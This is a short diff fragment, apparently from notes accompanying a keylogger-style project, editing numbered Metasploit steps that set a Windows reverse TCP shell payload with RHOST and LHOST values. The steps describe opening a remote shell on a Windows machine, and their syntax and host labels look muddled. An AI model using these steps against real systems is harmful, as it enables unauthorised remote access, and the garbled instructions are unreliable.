@@ -118,7 +118,7 @@ with Listener(on_press=on_press) as listener:
 
 3) set RHOST (WINDOWS IP)
 
-4) set payload/windows/shell/reverse_tcp
+4) set PAYLOAD/windows/shell/reverse_tcp
 
 5) set LHOST (WINDOWS IP)
 
